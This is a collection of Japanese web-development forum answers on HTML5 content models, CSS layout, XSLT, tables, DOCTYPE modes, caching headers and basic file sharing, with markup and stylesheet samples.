古いブラウザには無効ですから、それはそれで仕方ないとして・・ 画像とその説明ですから、シンプルなul(順不同リスト)でマークアップされているでしょうから。 <div class="section"> 　<h2>見出し</h2> 　<div class="album"> 　　<ul> 　　　<li><img src="./images/photo/01.jpg" width="240" height="180" alt=""> 　　　　<p>画像の説明</p> 　　　</li> 　　　<li><img src="./images/photo/02.jpg" width="270" height="360" alt=""> 　　　　<p>画像の説明</p> 　　　</li> 　　　<li><img src="./images/photo/03.jpg" width="200" height="200" alt=""> 　　　　<p>画像の説明</p> 　　　</li> 　　　<li><img src="./images/photo/04.jpg" width="240" height="180" alt=""> 　　　　<p>画像の説明</p> 　　　</li> 　　　<li><img src="./images/photo/05.jpg" width="240" height="180" alt=""> 　　　　<p>画像の説明</p> 　　　</li> 　　　<li><img src="./images/photo/06.jpg" width="160" height="120" alt=""> 　　　　<p>画像の説明</p> 　　　</li> 　　　<li><img src="./images/photo/07.jpg" width="320" height="240" alt=""> 　　　　<p>画像の説明</p> 　　　</li> 　　　<li><img src="./images/photo/08.jpg" width="320" height="240" alt=""> 　　　　<p>画像の説明</p> 　　　</li> 　　　<li><img src="./images/photo/09.jpg" width="300" height="300" alt=""> 　　　　<p>画像の説明</p> 　　　</li> 　　　<li><img src="./images/photo/10.jpg" width="240" height="320" alt=""> 　　　　<p>画像の説明</p> 　　　</li> 　　　<li><img src="./images/photo/11.jpg" width="320" height="240" alt=""> 　　　　<p>画像の説明</p> 　　　</li> 　　</ul> 　</div> </div> だとしたら、 div.album{width:90%;margin:0 auto;} div.album ul,div.album ul li{list-style-type:none;} div.album ul{text-align:center;text-align:justify;} div.album ul li{display:inline-block;text-align:left;} で良いかと・・。
＞「全ての製品」をクリックすると下記のような表がポップアップで表示されるようにしたいと思っています。 　言葉通りの動作をさせるなら、javascriptを使用するべきでしょう。 　スタイルシートには、onClickに対応する動作はありません。もしスタイルシートで行うなら、:hover(ポインターをあわせると)で、メニューが表示されるか方式でしょう。 　クリックして表示させるには、あらかじめ表示領域を確保しておいて、何らかの画像なりを表示させてクリックするとページ内アンカーで表示部を移動させることになります。 <nav> 　<ol> 　　<li>トップ</li> 　　<li>新製品 　　　<ol> 　　　　<li></li> 　　　</ol> 　　</li> 　　<li id="product">製品情報 　　　<ol> 　　　　<li><a href="">製品１</a> 　　　　　<ol> 　　　　　　<li><a href="">特徴</a></li> 　　　　　　<li><a href="">詳細</a></li> 　　　　　　<li><a href="">機能一覧</a></li> 　　　　　</ol> 　　　　</li> 　　　　<li><a href="">製品２</a> 　　　　　<ol> 　　　　　　<li><a href="">特徴</a></li> 　　　　　　<li><a href="">詳細</a></li> 　　　　　　<li><a href="">機能一覧</a></li> 　　　　　</ol> 　　　　</li> 　　　　<li><a href="">製品３</a> 　　　　　<ol> 　　　　　　<li><a href="">特徴</a></li> 　　　　　　<li><a href="">詳細</a></li> 　　　　　　<li><a href="">機能一覧</a></li> 　　　　　</ol> 　　　　</li> 　　　</ol> 　　</li> 　　<li>略</li> 　</div> </nav> として、navを縦・横を決めて配置してoverflow:hiddenで他の部分を隠します。#productが選択(クリック)されると、内容がスクロールされて、同じページに現れる。
提供する側のOSは何でしょうか？ 共有設定は正しくされていますか？ アクセス権を設定している場合、ユーザーID/パスワードは？ http://support.microsoft.com/kb/2485635/ja 共有名とは、上記URLの手順で共有フォルダの設定をした時に付ける名前です。 具体的には25と26の間に設定されています。ドライブ名ではありません。 http://kotohazime.fc2web.com/xp/xp4.html こちらでもありますね。
確かにHTML5と言えなくもないですが、HTML5は【意味的な】文書構造しか書きませんから、「以下のように並べたいのですが、」--どのようにプレゼンテーションするかとは分けないと。 　これは、CSS3の範疇です。 　CSS3には、Multi-column Layout モジュールと、Flexible Box Layout モジュールがあります。前者は、文字通り段組で列数にしたがって一列目から流し込んでいきます。後者は３つの縦ブロックを使います。 　ただ、いまだに50%弱のシェアのあるIE8以下の存在を考えるとCSS3はまだ早いかもしれません。 　このようなリストで内容の大きさがある程度わかっている場合は、 <section> 　<section> 　　<ul> 　　　<li></li> 　　　<li></li> 　　</ul> 　　<ul> 　　　<li></li> 　　　<li></li> 　　</ul> 　　<ul> 　　　<li></li> 　　　<li></li> 　　</ul> 　</section> 　<section> 　　<ul> 　　　<li></li> 　　　<li></li> 　　</ul> 　　<ul> 　　　<li></li> 　　　<li></li> 　　</ul> 　　<ul> 　　　<li></li> 　　　<li></li> 　　</ul> 　</section> 　<section> 　　<ul> 　　　<li></li> 　　　<li></li> 　　</ul> 　　<ul> 　　　<li></li> 　　　<li></li> 　　</ul> 　　<ul> 　　　<li></li> 　　　<li></li> 　　</ul> 　</section> </section> に対して、 section{position:relative;width:100%;} section section{width:32%;margin:0 33%;} section section+section{position:absolute;top:0;left:0;margin:0;} section section+section+section{right:0;} とかのほうが実用的でしょう。
通常は、HTTP応答ヘッダに Last-Modified: Mon, 12 Nov 2012 08:15:53 GMT があるはずですので、ユーザーが「更新されていると再読み込み」(デフォルト)に設定していると更新されて絵いれば再読み込みされるはずです。 　ページを更新すると、 Last-Modified: 　の値が変更されているかを、まず確認してください。 　firefoxのLive HTTP Headers ( https://addons.mozilla.jp/firefox/details/3829 )を使うと良いでしょう。 .htaccess ないし、httpd.confで Cache-Control: max-age=0"指令　などの指定をすればよいかと 詳しくは http://www.y-adagio.com/public/standards/tr_http …
スタイルシートやタグ属性で何も指定しなければ、内容に応じて大きくなったり小さくなったりします。
>ワードプレスのCSSの使い方って、通常のHPと同じなんでしょうか？ 同じです。
　HTMLは、その文章を読み解き、要素に分解して、それをそのままマークアップしていけばよいのです。 　文書全体の構成がわかりませんが、示された文章からだけだと ・保存場所がいらない。 ・かさばらない 　の部分は、箇条書きですね。箇条書きとは端的に要約したものです。この場合順不同リストが適しているようです。 <ul> 　<li>保存場所がいらない。</li> 　<li>かさばらない</li> </ul> が良いでしょう。 では、この上の階層ではどうでしょう。単純にこれだけでしたら、定義リストを使用すべきでしょう。定義リストの用途は変遷がありますが、おおむね「フレーズ」と「その説明」と言う理解で良いでしょう。HTML4.01では仕様書に会話のマークアップが示されていましたが、HTML5では会話への用途は否定されています。 <dl> 　<dt class="merit">メリット</dt> 　<dd> 　　<ul> 　　　<li>保存場所がいらない。</li> 　　　<li>かさばらない。</li><!-- 上と同じだけど? --> 　　</ul> 　</dd> 　<dt class="demerit">デメリット</dt> 　<dd> 　　<ul> 　　　<li>すでに購入した本は、取り込みの手間が発生</li> 　　　<li>普通に購入するより値段が高い</li> 　　　<li>何年も経って使えるのか？</li> 　　</ul> 　</dd> </dl> 　のようにしたり、 <div class="section merit"> 　<h2>メリット</h2> 　<p>なんたらかんたら</p> 　<ul> 　　<li>保存場所がいらない。</li> 　　<li>かさばらない。</li><!-- 上と同じだけど? --> 　</ul> </div> <div class="section demerit"> 　<h2>デメリット</h2> 　<ul> 　　<li>すでに購入した本は、取り込みの手間が発生</li> 　　<li>普通に購入するより値段が高い</li> 　　<li>何年も経って使えるのか？</li> 　</ul> </div> としたりします。要は、文書全体(特に直近の親)の構成などによりマークアップしていくことになるでしょう。
IE8の性質かもしれません。 IE9にしてみてください。 http://windows.microsoft.com/ja-JP/internet-expl … 参考URL：http://windows.microsoft.com/ja-JP/internet-expl …
<table> <tr><td rowspan=2>1-1</td><td rowspan=2>1-2</td></tr> <tr></tr><!-- ２行目がない --> <tr><td>3-1</td><td>3-2</td></tr> </table> ┌──┬──┐ │1-1 │1-2 │ ┝━━┿━━┥ │3-1 │3-2 │ └──┴──┘ にしか、なりようがないです。・・・データがない場合は、<tr></tr>を出力しないようにして、高くしたいセル--たとえばclass名など他の属性を与えましょう。 <table> <tr><td height=2>1-1</td><td height=2>1-2</td></tr> <tr></tr><!-- ２行目がない --> <tr><td>3-1</td><td>3-2</td></tr> </table> とか、 ★どうしても方法がないなら・・・要素セレクタを使って td[rowspan="2"]{padding:0.5em 0;} ですかね。
大きな誤解をされています。 「結局、HTML4でいうところのインラインボックスやブロックボックスは、どのカテゴリになったの？」 HTML4.01では、ブロック要素とインライン要素しかありませんでした。 『7.5.3 ブロックレベル要素と行内要素 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　「ブロックボックスやインラインボックス」は、スタイルシートの視覚メディアに対する整形と言うHTMLとは別の用語です。これは、HTML5の仕様に含められることもあるCSS3ではそのまま引き継がれています。その意味ではなくなってはいません。 　もっと端的にわかり易く言うと、HTML4までは、文書構造を示す要素の分類は特にされていませんでしたが、HTML5では、プレゼンテーションと文書構造の分離をより徹底するために、HTML上の要素は、文書構造上の意味から分類されています。 整理してみました。 メタデータ・コンテンツ (Metadata content) 　base,command,link,meta,noscript,script,style,title フロー・コンテンツ (Flow content) 　a,abbr,address,area (map 要素の子孫のとき),article,aside,audio, 　b,bdi,bdo,blockquote,br,button,canvas,cite, 　code,command,datalist,del,details,dfn,div,dl,em,embed,fieldset,figure, 　footer,form,h1,h2,h3,h4,h5,h6,header,hgroup,hr,i,iframe,img,input, 　ins,kbd,keygen,label,map,mark,math,menu,meter,nav,noscript,object,ol, 　output,p,pre,progress,q,ruby,s,samp,script,section,select,small, 　span,strong,style (scoped 属性があるとき),sub,sup,svg, 　table,textarea,time,u,ul,var,video,wbr,およびテキスト セクショニング・コンテンツ (Sectioning content) 　article,aside,nav,section ヘッディング・コンテンツ (Heading content) 　h1,h2,h3,h4,h5,h6,hgroup フレージング・コンテンツ (Phrasing content) 　abbr,audio,b,bdi,bdo,br,button,canvas,cite,code,command,datalist, 　dfn,em,embed,i,iframe,img,input,kbd,keygen,label,mark,math,meter, 　noscript,object,output,progress,q,ruby,s,samp,script,select,small, 　span,strong,sub,sup,svg,textarea,time,u,var,video,wbr,およびテキスト 　そして、内容にフレージングコンテンツのみが入っているときの 　a,del,ins,map 　(map要素の子孫のとき)のarea エンベッディッド・コンテンツ (Embedded content) 　audio,canvas,embed,iframe,img,math,object,svg,video 　および、MathMLやSVG インタラクティブ・コンテンツ (Interactive content) 　a,button,details,embed,iframe,,keygen,label,select,textarea, 　controls 属性が存在しているaudio,video, 　usemap 属性が存在しているimg,object 　type 属性が Hidden 状態でないinput 　type 属性が toolbarのmenu ・・・一目でわかるように、これらはもっぱら「文書構造」で分類したものです。 ★どのカテゴリーにも分類されないもの 　dd,dt,liなど・・ 　あなたが言われる「ブロックボックスやインラインボックスはHTML4までの概念です」は、より細かく分類され、ブロック要素はセクショニングコンテンツと、ヘッディングコンテンツに分類され、インライン要素はフレージングコンテンツとエンベッディッドコンテンツ、インタラクティブコンテンツに再分類されたと考えるべきでしょう。 　その場合、それらの登場形態によって、その分類に含まれなかったり他の分類がされる場合があること。そしてこれらすべてをひとまとめにしてフロー・コンテンツ--流し込めるデータ--とする。 　と考えれば良いです。 ・・・・・・・・以上はHTMLのマークアップの問題です。 「個人的な見解ですが、CSSのdisplay属性にinlineとかblockがそのまま残っていることに違和感があります。」 　これはスタイルシート側の問題です。文書構造を担うHTMLとプレゼンテーションを担うスタイルシート--特に視覚メディアに対する整形モデル--を混同して考えるから、違和感を感じるのでしょう。スタイルシートでは、displayプロパティによって、整形上の他の整形モデルに変更できます。 　なお、CSS3のdsplayの値は、 inline | block | inline-block | list-item | run-in | compact | table | inline-table | table-row-group | table-header-group | table-footer-group | table-row | table-column-group | table-column | table-cell | table-caption | ruby | ruby-base | ruby-text | ruby-base-group | ruby-text-group | <template>| none
＞tdやpにmarginを指定したり、cellpadingなど色々試しましたがうまく行きません。 どこかでミスしているのでしょうが、 ※ cellpading → cellpadding ※ tdのmarginは意味が違う。 それらを見つからなければ、正しい方法でも反映しませんよ・・・ 一応、下記が簡単なCSSです。 --------------------------- （１）全部のテーブル （２）全部ではないが複数のテーブル？ （３）１つだけのテーブル？ これによって考え方が変わるので、セレクタも違います。 見栄えの部分は、外部CSSで指定するのがスマートです。 padding　つまり、セルの内側に隙間を設ける事ができます。 paddingは、上下左右４カ所のスペースを値で指定します。（１カ所～４カ所可能） この設定順は（左から書く順） padding: 上値 右値 下値 左値; のような順で各半角スペースで区切ります。 値は、px や em など。 （１）の全テーブルの場合、 cellpadingをテーブル毎に指定するよりも、 CSS一カ所で全てのテーブルセルを指定 CSSは、 table td{padding: 0.5em 0.6em 0.3em 1em;} （２）複数のテーブルの場合、 指定したいテーブルにclassを付ける HTMLで、 <table summary="○○の表" class="space1"> CSSで、 table.space1 td{padding: 0.5em 0.5em 0.3em 1em;} （３）１つだけテーブルを任意指定する場合、 #3-4さんの方法、または（２）の方法など、 通常のテーブルの他に１カ所以上（複数でもよい）の設置する場合
代替文字の例ですが <li>手順1：ファイルメニューを選択します</li> 　　<p><a href="img="002.png"><img="t002.png" alt="メニューバーのファイルをクリックすると項目が現れるので、それから「保存」を選択します。"></a></p> </li> のように画像がなくても意味が通じるように書きます。いくら長くても、画像が読み込まれすれば表示されません。 　一番よくわかるのは、Lynxなどのテキストブラウザで眺めてみることです。
最初の画像がどんな文字を置き換えたものかがわからないのと、２番目以降の画像の意味もわからないので、想像でしかありませんが、 HTML自体は下記のように、簡単になります。 これだったら、わざわざWebオーサリングツールを使う必要はなく、HTMLエディタ ( http://ja.wikipedia.org/wiki/Web%E3%82%AA%E3%83% … )、すなわちテキストエディタで十分です。 ★最後に全体を書いておきます。 ★画像にはalt属性が必要です。 『height属性とwidth属性は、ユーザエージェントに対して画像やオブジェクトの大きさに関する概念を知らせるので、ユーザエージェントは画像やオブジェクトに割り当てる空間を予約し、そのデータが届くのを待っている間も文書のレンダリングを継続できる。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 ポイント 1)マージンはそのブロックのマージンを書きます。元もとのHTMLでしたらtable+teble{margin-top:10px;}でよいのですよ。 意味は、tableに続く(並んだ)tableの上にマージン10pxと言う意味です。 2)HTMLにはデザインに関する記述は一切無い(特に二番目)ので、どのようにも、デザインできます。まったくデザインを変えることも簡単です。今回はウィンドウ幅をどのように変えても中央に配置されますが、これをウィンドウ幅を変えたら追随して表示も変化させてスマホなどに対処させるとかも <body> 　　<div class="header"> 　　　　<h1><img src="img/top_image.png" width="700" height="40" alt="見だし(タイトルと原則同じ)" ></h1> 　　</div> 　　<div class="section" id="message"> 　　　　<h2>このサイトのごあんない</h2> 　　　　<p>このサイトは～～～～～～</p> 　　</div> 　　<div class="section" id="message2"> 　　　　<h2>このサイトのごあんない２</h2> 　　　　<p>このサイトは～～～～～～</p> 　　　　<p>また、このサイトの～～～～～～。</p> 　　　　<div class="footer"> 　　　　　　<h2>問い合わせ</h2> 　　　　　　<address>電話番号　000-000-0000</address> 　　　　</div> 　　</div> </body> </html> あるいは最初の画像も文書にとって背景でしたら <body> 　　<div class="header"> 　　　　<h1>見だし(タイトルと原則同じ)</h1> 　　</div> 　　<div class="section" id="message"> 　　　　<h2>このサイトのごあんない</h2> 　　　　<p>このサイトは～～～～～～</p> 　　</div> 　　<div class="section" id="message2"> 　　　　<h2>このサイトのごあんない２</h2> 　　　　<p>このサイトは～～～～～～</p> 　　　　<p>また、このサイトの～～～～～～。</p> 　　　　<div class="footer"> 　　　　　　<h2>問い合わせ</h2> 　　　　　　<address>電話番号　000-000-0000</address> 　　　　</div> 　　</div> </body> </html> [全体] ★Another HTML-lint gateway ( http://cetus.sakura.ne.jp/htmllint/htmllint.html ) ★W3C CSS 検証サービス ( http://jigsaw.w3.org/css-validator/#validate_by_ … ) で検証済みのHTML4.01strict+CSS2.1です。 ★タブは＿に置換してあるので戻してください。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;} body{ background-color:#6C6; font-size: 0.8em; font-family: "メイリオ", "Meiryo", "ヒラギノ角ゴ Pro W3", "Hiragino Kaku Gothic Pro", "ＭＳ Ｐゴシック", "MS P Gothic",sans-serif ; } h1,h2,p{margin:0;} div.header,div.section,div.footer{ width: 700px ;margin: 0 auto; background-color: #FFF; } h1{font-size:30px;line-height:10px;} div.section{ width:640px;/* 左に置く画像幅分引いたもの */ padding-left:60px;/* 左に置く画像幅分 */ } div.section{background:url(img/aaa.png) repeat-y #E8FECF;} div.section+div.section{background:url(img/bbb.png) repeat-y #E8FECF;} div.footer{width:640px;background-color:#E8FECF;} div.section p,div.footer p{ margin:0 1em; text-indent:1em; line-height:1.6em; } h2{ padding-left: 10px; background-color: #009900; width: 180px; color:#FFF; font-size: 1.1em; height: 25px; line-height:25px; } --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1><img src="img/top_image.png" width="700" height="40" alt="見だし(タイトルと原則同じ)" ></h1> ＿</div> ＿<div class="section" id="message"> ＿＿<h2>このサイトのごあんない</h2> ＿＿<p>このサイトは～～～～～～</p> ＿</div> ＿<div class="section" id="message2"> ＿＿<h2>このサイトのごあんない２</h2> ＿＿<p>このサイトは～～～～～～</p> ＿＿<p>また、このサイトの～～～～～～。</p> ＿＿<div class="footer"> ＿＿＿<h2>問い合わせ</h2> ＿＿＿<address>電話番号　000-000-0000</address> ＿＿</div> ＿</div> </body> </html>
　サムネイルの目的は、データ転送量を少なくして、ネット負荷を軽減させたりページ表示を早めるためです。圧縮率を調整してデータ量を少なくしたほうが良いでしょう。ソフトの能力でそれができないなら、単に表示画像を小さくするほうが良いです。特に印刷やスマートホンでの利用が考えられるページでしたら、それらの解像度はパソコンのディスプレイより高いため画像が荒れて表示されます。 　<img src="./images/png/1.png" width="400" height="400" alt="何たらが何とかしている"><!-- 画像実サイズは800×800 --> 　とか。スタイルシートで画像を合わせているときなど img{display:block;width="100%" height="auto";} 　とかでは、大きくなってもきれいに見えますし・・
コマンドプロンプトでの操作はめんどくさいです。 WindowsならエクスプローラがFTPに対応してます。 これなら別途FTPツールを用意する必要がなくなります。 アドレス欄に、 ftp://ユーザアカウント名:パスワード@ホスト名 接続に成功すれば左ペインのツリーからドラッグで転送完了。
詳しく説明すると、<img>や<a>要素は行内要素ですから、body直下に置くことはできません. 本来は<div>内に置くのも、divの使い道がいくつかのブロックをまとめるための場合もダメなのですが、文法的にはあっています。 <body> 　<p id="counter"><script language="JavaScript" type="text/javascript" src="ソースアドレス"></script> <noscript> <a href="ソースアドレス"><img src="画像アドレス"></a> </noscript> 　</p> なら良いです。 　なお、スクリプトが出力するHTMLソースも含めて、チェックすべきです。savascriptが、<p>などを含めて出力している場合は、上記ソースでは不整合となります。 結果的に <body> 　<p id="counter"><p><img ****></p> 　</p> となってしまいますから、 firefox + firebugで出力されたHTMLに対しても見ておくことを薦めます。
WindowsXP + safari5.1.7 スタイルシートxx.css ﻿ @charset "UTF-8"; html,body{margin:0;padding:0;} div.album h2{color:green;} div.album{counter-reset: image;} div.album p{width:320px;height:auto;position:relative;float:left;margin:10px;} div.album p img{display:block;width:90%;height:auto;padding:5%;} div.album p:before { content: "画像" counter(image) ; counter-increment: image 1; } スタイルシート　style.xsl[全角スペース→タブ] <?xml version="1.0" encoding="UTF-8"?> <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"> 　　<xsl:template match="/"> 　　<html> 　　　　<head> 　　　　　　<title>サンプル</title> 　　　　　　<link rel="styleSheet" type="text/css" href="./xx.css" /> 　　　　</head> 　　　　<body> 　　　　　　<h1>画像を表示してみよう</h1> 　　　　　　<div class="album"> 　　　　　　　　<h2>画像一覧</h2> 　　　　　　　　<xsl:apply-templates /> 　　　　　　</div> 　　　　</body> 　　　　</html> 　　</xsl:template> 　　<xsl:template match="photo"> 　　　　<p> 　　　　　　<img> 　　　　　　　　<xsl:attribute name="src"> 　　　　　　　　　　<xsl:value-of select="@url" /> 　　　　　　　　</xsl:attribute> 　　　　　　　　<xsl:attribute name="width">320</xsl:attribute> 　　　　　　　　<xsl:attribute name="height">240</xsl:attribute> 　　　　　　</img> 　　　　</p> 　　</xsl:template> </xsl:stylesheet>
HTMLと同様にスタイルシートで指定します。XMLですから、XSLTスタイルシートでHTMLに変換して、デザインはCSSに分担させても良いでしょう。 ★タブは全角スペースに置換してあるので、タブに戻すこと。 <?xml version="1.0"?> <?xml-stylesheet type="text/xsl" href="style.xsl"?> <photos> 　<photo url="http://www.kahokanko.com/demo/10.jpg"/> 　<photo url="http://www.kahokanko.com/demo/19.jpg"/> 　<photo url="http://www.kahokanko.com/demo/31.jpg"/> </photos> とします。 [style.xsl] <?xml version="1.0" encoding="UTF-8"?> <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"> 　<xsl:template match="/"> 　<html> 　　<head> 　　　<title>サンプル</title> 　　　<link rel="styleSheet" type="text/css" href="./xx.css" /> 　　</head> 　　<body> 　　　<h1>画像を表示してみよう</h1> 　　　<div> 　　　　<xsl:apply-templates /> 　　　</div> 　　</body> 　　</html> 　</xsl:template> 　<xsl:template match="photo"> 　　<p class="album"> 　　　<img> 　　　　<xsl:attribute name="src"> 　　　　　<xsl:value-of select="@url" /> 　　　　</xsl:attribute> 　　　</img> 　　</p> 　</xsl:template> </xsl:stylesheet> [xx.css] @charset "UTF-8"; html,body{margin:0;padding:0;} p.album img{display:block;float:left;width:360px;height:auto;margin:10px;}
アクセスのルールがイマイチ分かりませんが (「数字.cgi」なら「数字.html」の同一名のファイルに飛ばすなど) queryを置き換えてからRewriteRuleを使用して飛ばしてみては？ 参考URL：http://oshiete.goo.ne.jp/qa/6224356.html
http://ja.wikipedia.org/wiki/%E8%A3%9C%E8%89%B2
日本語を表示できないフォントが指定されて日本語が書かれている場合、ブラウザに指定されたデフォルトフォントか、日本語を表示できるフォントを使用します。 デフォルトフォントか代替フォントがMSゴシックなら、MSゴシックと同じになります。 ブラウザの仕組みですので、ブラウザに依っては文字化けします。
floatは回り込ませるプロパティではありません。ある条件の場合にはそのように見えるだけです。 http://mb.blog7.fc2.com/blog-entry-61.html http://d.hatena.ne.jp/ku__ra__ge/20120418/p2 フロートは簡単にいうと、本来の流れから切り離して右や左に寄せる感じです。 コップに水を入れ氷を入れます。氷はフロートです。コップの中で右に寄せると、水を押しのけ右にいくでしょう。でも氷がない場所は（氷の下）は水で埋まります。通常のmarginは接するコップです。氷は切り離されているので自身になります。 最初のソースでは、まずフロートで切り離して左にleftが寄ります。次にrightの右に間を空けたい記述をmargin-leftで行ったようです。margin-leftは切り離され邪魔をしているleftからの距離ではなく、その親（コップ）、からの距離を指定します。もしこれが、left側からmargin-rightをする場合は、10pxとなります。切り離されたブロックの周りに10ｐｘあけるということです。 2つ目のソース.「rightのmargin-left:350px;を10pxにして.rightにもfloat:left;とかけるとうまく回り込みます。」 今、切り離されたブロックが2つあります。ブロック自身の空きを10pxとしているので空きが10pxあきます。 2つとも切り離されていますので、ソースや表示の大原則、左から右に、上から下に解釈され、1つ目のフロートの右側に2つ目のフロートが入るスペースがなくなるまで左から右に（float:leftの場合）上から下につめられます。回り込んでいるのではなく、浮いたものが順番に並んでいる状態です。 左右は上記です、上下はfloatは切り離されているので（浮いている？）高さが持てません。今は割愛しますが、floatを回り込ませるプロパティなんて考えていると、つっかえたり、高さが持てない（親が自動で広がらない。例：バックグラウンドがなぜか思うように効かない）ことがわからず苦労しますよ。
何か、「見てくればかり重視する」ことと「論理的な最適化HTML」の比較論になっているような気がしますが、そこまで大げさな話題ではないと思います。 ちょっと極論になりますが、「マークアップ」と「イメージ優先」の違いは、所詮は<img>タグがダイレクトに配置されているか、CSSでブロック要素の背面に配置されているかの違いじゃないでしょうか。 で、イメージ重視になってくると、どうしても画像部品が増え、全部CSSに組んでいると生産性がガタ落ちになるため、直接HTMLに置いてしまう、と。 そうすると、鬼の首でも取ったように、「HTMLの理念に反している」という意見が出てくるような気がします。 少なくともお仕事でWebサイトの制作をされているデザイナさんであれば、ビジュアルの力量は申し分ないことと思いますので、 ・見出しタイトル画像は、<h1><h2>タグなりのbackground-imageとして配置する ・ブロック要素としての画像配置は、できるだけCSS背面とする。 ・細かいオーナメントのうち、イレギュラーなものはなるべくCSS描画にする とすれば、大幅に「最適化HTML」に近づくと思います。 うちの会社はWebプログラムの開発がメインですが、企業サイトではデザイナがらみがほとんどなので、（CSS配置も含めて）画像点数が多く、プログラマもDreamweaverを使っています。 エディタマークアップだけで済むほど世の中簡単じゃないです。 デザイナにはDreamweaver、プログラマにはAptanaやEclipseが必要なのは常識です。 で、皆、HTMLとCSSを触る。どれが正解ということはない。 企業に押し掛けて、「アンタのとこのサイトは画像ばっかりでなってない」と押し売りする輩は、「アンタんとこのサイトは被リンク数がほとんどない」と、ＳＥＯを押し売りしている輩と同じ下司野郎です。 ケチをつけることはできても、新しい価値やサービスを創造できるわけではない。気にすることはありません。 その程度のことで上がるアクセスアップなんかたかが知れていますし。 デザイナの力量はビジュアルで決まります。 方法論にこだわるあまり、ビジュアルの生産性を落としてまでマークアップを意識する理由はないです。 マークアップだけなら格安で下請けするところもいっぱいありますので、そういうところを使われるのもアリですよ。
フリーのデザイナさんにお仕事を紹介しているサイトで、有料のコンサルテーションを頼んだらいかがでしょうか？ 1回２時間10,000円とかでお願いすれば、数回で簡単な疑問は解けると思います。 特に、女性のコンサルタントさんとかでしたら、出費は勿体ないと思わないですよ、きっと。 いいとこ見せようとして必死に勉強しますし。一石二鳥だわ（笑
HTMLに <meta name="viewport" content="width=device-width, initial-scale=1.0"> CSSのhtmlに html {-webkit-text-size-adjust: none} でスタイルシートの設定が生きてくるはずです。 　ただ、固定サイズはまずいので、リキッドにしてスマホを横にしてもよいようにしておくほうが良いでしょう。
DOCTYPEは、必ずつけることになっています。 　もちろんつけなくても表示できます。 　このふたつはきちんと区別してください。お酒を飲んだら運転してはなりませんけど、お酒を飲んでも車は運転できます。 　ブラウザにとって、それに、どのような働きがあるのかは DOCTYPEスイッチ－HTMLの基本 ( http://www.htmq.com/htmlkihon/302.shtml ) 　をお読みください。 　基本的に、ブラウザが標準モードで動作するようにDOCTYEを記述し、そのDOCTYPEに従ったHTMLを記述すれば良いです。 <!DOCTYPE html> 　はHTML5で使用するDOCTYPE宣言で、これは従来のDOCTYPEと意味が異なり、ブラウザに対して『標準モード』を指定するスイッチの機能しかありません。 　繰り返しますが、今後はHTMLは標準モードが基本となります。互換モードは言い換えれば、ウェブ標準でない時代のＩＥの動作です。他のブラウザで確認されるとわかりますが、ほとんどあなたの期待通りには表示されないと思います。firefox,Opera,Chromeなどで確認してください。 　また、レイアウトをtableを用いて行うのはウェブ標準ではありません。 「単に文書内容を整形する目的だけで表を用いるべきでない。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 「ページレイアウトの目的で表を用いる。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 　も含めて、HTMLやスタイルシートのほうを見直して、標準モードでも期待通りに表示されるようにしてください。
ロールオーバーについてはやり方がいくつかあります。 spoyura-jamさんがどの方法を用いているのか分かりませんので、tracerがおっしゃる通り該当する箇所のソースコードを貼ってもらうと、具体的な回答がしやすいですね。 前はできてたとのことなので、コードの記述ミス、指定したパスに画像がない線が濃厚だと思います
はじめまして。 CSSのdisplayプロパティは単純に表示形式を制御しているだけです。 FORMのSELECTタグにdisplay:noneを適用した場合非表示になりますが、SUBMITをすればSELECTタグの値も送信されます。 非表示のSELECT要素を送信したくない場合はJavaScriptで各SELECTタグのdisabledプロパティをtrueに設定して下さい。
htmlは、見た目をどうこうするためのものではなく、文書の構造を定義するものなので、 連続して改行するとかは、目的に反しているということなんでしょう。 なので、ちゃんと書きたい場合はそのようにいちいち囲みます。 そういうことでいいんです。 ただ、p は改行のためのものではなく、段落を定義するものです。 でも、ブログなのでしたら、たくさんの違反がデフォルトでされているかもしれないので、 規則通りのものを書きたいなら、１からサイトを作った方がいいとおもいます。
ユーザースタイルシートってOSの仕組みではなくブラウザの仕組みではないですか？ だとしたら、どのブラウザで、どういったプラグインを用いてユーザースタイルシートを実現しているか等 あなたのブラウジング環境を書かないと答えようがないとおもいますよ。 どうしてもややこしい事がいやなら、ユーザースタイルシートを使わないで見るためのブラウザを用意しておくのもいいかも。 （ユーザースタイルシートを適用したくないサイトは、そっちのブラウザで見る）
googleの説明をまず読んでください。 そのうえで、どこがわからないかを聞かれたら適切なアドバイスが得られると思います。 ウェブマスター – Google ( http://www.google.co.jp/intl/ja/webmasters/ ) sitemapは、サイトの構成をgoogleに伝えるデータです。
ほかの方が書かれていますが、まずは落ち着きましょう。 覚えたいと思ってあっという間に覚えれる人はそうそういないのです。 昔のとある番組ですが、1週間で円周率を100桁暗記できたら100万円 なんてのをやってました。 お金のためなら間違えずに確実に覚えれますか？ ということなのです。 基礎がわからないのにいきなりのぶっつけ本番では、 何も覚えれないし何も進めないのです。 まずは基礎を身に着けるところから始めましょう。 ということで基礎編。 ＞例えば<h1 style ="background-color: #----;">とHTMLへ書いた場合はを　h1{background-color: #---}のように書き直さないといけないのですか？ 大半は合ってますが状況によっては微妙に違います。 例えば、<h1>タグが1つだけならそれでも良いでしょう。 ですが、 <h1>あいさつ</h1> <p> 当社は・・・中間省略・・・を目指して邁進して参ります。 </p> <h1>経営理念</h1> <p> 生産第一をモットーに・・・以下略 </p> というHTMLソースがあったとします。(PageRankうんぬんは置いておくとして) CSSに、 h1 { background: #eff; color: blue; } と記載したとすると、 <h1>あいさつ</h1>の内容と<h1>経営理念</h1>の内容が 同じとなってしまいます。 これでは別々にしたいときに困りますよね。 ということで別々にしてみましょう。 HTML部分 <h1 id="greet">あいさつ</h1> <p> 